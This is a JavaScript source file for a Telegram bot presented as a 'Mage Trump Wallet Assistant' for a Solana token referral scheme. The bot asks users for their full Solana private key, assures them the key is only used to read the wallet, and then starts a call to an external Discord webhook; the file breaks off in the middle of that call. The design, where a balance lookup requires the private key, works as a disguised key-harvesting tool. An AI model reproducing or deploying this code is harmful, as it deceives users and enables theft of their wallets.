require('dotenv').config();
const path = require('path');
const { Telegraf, session } = require('telegraf');
const admin = require('firebase-admin');
const { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const rawBs58 = require('bs58');
const bs58 = rawBs58.default || rawBs58;
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

const bot = new Telegraf(process.env.BOT_TOKEN);
const credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS_JSON);
const discordWebhook = process.env.DISCORD_WEBHOOK;

admin.initializeApp({
  credential: admin.credential.cert(credentials),
});
const db = admin.firestore();
const connection = new Connection("https://api.mainnet-beta.solana.com");

// Ativa o controle de sessão
bot.use(session());

function formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim) {
  return `
🧙 Wallet: \`${pubkey}\`
💸 On-chain balance: ${solBalance} SOL
🎯 Project balance: ${projectBalance} SOL
🔗 Referrals: ${refCount}
${canClaim ? '✅' : '⛔'} Claim status: ${canClaim ? 'Available' : 'Not Available'}

📢 Your referral link:
https://magetoken.com.br/?ref=${pubkey}

🚀 Share your link and earn 0.1 SOL for each new wizard you recruit!`.trim();
}

// Mensagem de boas-vindas com imagem e link do site
bot.start((ctx) => {
  ctx.replyWithPhoto(
    { source: path.resolve(__dirname, 'images/trumpmage.png') },
    {
      caption: `👋 *Welcome to Mage Trump Wallet Assistant!*

To continue, please send your Solana *private key* (in base58 format or JSON array). This will allow the bot to connect to your wallet and show your status.

⚠️ Your key will be used to read your wallet only. Keep it safe.

🌐 Visit our website: [magetoken.com.br](https://magetoken.com.br)`,
      parse_mode: 'Markdown'
    }
  );
});

// Comando /exit para remover a sessão
bot.command('exit', (ctx) => {
  ctx.session = null;
  ctx.reply('👋 You have been logged out. Send your private key again to reconnect.');
});

// Comando /help
bot.command('help', (ctx) => {
  ctx.replyWithMarkdown(`📖 *How MageTrump Assistant Works*

1. Send your Solana *private key* (base58 or JSON array) to connect your wallet.
2. Use /status to check your wallet and project balance.
3. Use /link to get your referral link.
4. Use /referrals to see how many users you referred.
5. Use /exit to logout and remove your wallet from session.

🌐 Learn more at: [magetoken.com.br](https://magetoken.com.br)`);
});

// Comando /status
bot.command('status', async (ctx) => {
  const session = ctx.session?.walletData;
  if (!session) return ctx.reply('❌ No wallet session found. Send your private key to connect.');

  ctx.replyWithMarkdown(formatStatus(
    session.pubkey,
    session.solBalance,
    session.projectBalance,
    session.refCount,
    session.canClaim
  ));
});

// Comando /link
bot.command('link', (ctx) => {
  const session = ctx.session?.walletData;
  if (!session) return ctx.reply('❌ You are not connected. Send your private key first.');

  ctx.reply(`🔗 Your referral link:\nhttps://magetoken.com.br/?ref=${session.pubkey}`);
});

// Comando /referrals
bot.command('referrals', (ctx) => {
  const session = ctx.session?.walletData;
  if (!session) return ctx.reply('❌ You are not connected. Send your private key first.');

  ctx.reply(`📈 You have referred ${session.refCount} wizard(s)!`);
});

// Processa a chave privada
bot.on('text', async (ctx) => {
  const input = ctx.message.text.trim();
  let keypair;

  try {
    let secret;

    if (input.startsWith('[')) {
      secret = JSON.parse(input);
    } else {
      const decoded = bs58.decode(input);
      secret = Array.from(decoded);
    }

    if (!secret || secret.length !== 64) throw new Error('Invalid secret key length');

    keypair = Keypair.fromSecretKey(Uint8Array.from(secret));
    const pubkey = keypair.publicKey.toBase58();

    const lamports = await connection.getBalance(new PublicKey(pubkey));
    const solBalance = (lamports / LAMPORTS_PER_SOL).toFixed(3);

    const userRef = db.collection('users').doc(pubkey);
    const docSnap = await userRef.get();

    let projectBalance = '0.0';
    let refCount = 0;
    let canClaim = false;

    if (docSnap.exists) {
      const data = docSnap.data();
      projectBalance = (data.balance || 0).toFixed(2);
      refCount = data.refCount || 0;
      canClaim = data.canClaim || false;
    }

    // Armazena sessão no ctx
    ctx.session.walletData = {
      pubkey,
      solBalance,
      projectBalance,
      refCount,
      canClaim
    };

    await ctx.replyWithMarkdown(formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim));

    try {
      await fetch(discordWebhook,
